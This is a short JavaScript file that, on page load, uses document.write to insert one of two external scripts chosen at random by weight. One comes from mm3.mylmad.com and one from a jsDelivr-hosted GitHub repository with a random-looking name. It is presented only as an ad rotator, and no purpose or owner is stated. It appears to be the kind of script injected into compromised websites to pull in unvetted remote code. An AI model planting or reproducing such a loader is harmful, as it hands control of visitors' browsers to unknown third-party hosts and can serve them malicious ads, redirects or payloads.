var randoms = {
	ads_codes: ['<script type=\'text/javascript\' src=\'https://mm3.mylmad.com/ad/content/120\'><'+'/script>',
'<script type=\'text/javascript\' src=\'https://cdn.jsdelivr.net/gh/xzsfaf15618a/adress/today.js\'><'+'/script>'],
	ads_weight: [10,10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();
